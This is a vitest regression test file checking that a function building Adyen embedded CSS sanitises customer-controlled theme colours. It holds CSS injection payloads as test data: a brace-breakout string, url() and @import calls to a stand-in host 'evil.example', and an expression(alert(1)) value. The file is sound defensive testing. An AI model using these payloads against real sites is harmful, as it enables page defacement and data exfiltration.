import { describe, expect, it } from "vitest";
import { defaultTheme, type DesignSystemTheme } from "@foxy.io/design-system/theme";

import { buildAdyenEmbeddedStyles } from "./adyen-embedded";

function themeWith(
  overrides: Partial<Record<keyof DesignSystemTheme["color"], string>>,
): DesignSystemTheme {
  return {
    ...defaultTheme,
    color: { ...defaultTheme.color, ...overrides },
  } as DesignSystemTheme;
}

describe("buildAdyenEmbeddedStyles", () => {
  // Regression test: this CSS text is written verbatim to a <style> tag's
  // textContent in document.head (see ensureAdyenEmbeddedStyles), so every
  // theme-derived value interpolated into it must be sanitized. `theme.color.*`
  // is sourced from public, customer-controllable `theme-*` HTML attributes.
  it("blocks a brace-breakout payload and falls back to the default color", () => {
    const maliciousPayload = "red} body{display:none} .x{color:red";
    const theme = themeWith({ body: maliciousPayload });

    const css = buildAdyenEmbeddedStyles(theme);

    expect(css).not.toContain(maliciousPayload);
    expect(css).not.toContain("body{display:none}");
    expect(css).toContain(defaultTheme.color.body);
  });

  it("blocks url(), @import, expression(), and semicolon payloads", () => {
    const payloads = [
      "red; } * { background: url(https://evil.example/steal)",
      "red;} @import url(https://evil.example/evil.css)",
      "red;behavior:expression(alert(1))",
      "red;}*{color:red",
    ];

    for (const payload of payloads) {
      const css = buildAdyenEmbeddedStyles(themeWith({ error: payload }));
      expect(css).not.toContain(payload);
      expect(css).toContain(defaultTheme.color.error);
    }
  });

  it("passes a legitimate custom color through unchanged", () => {
    const css = buildAdyenEmbeddedStyles(themeWith({ body: "#112233" }));

    expect(css).toContain("#112233");
    expect(css).not.toContain(defaultTheme.color.body);
  });
});
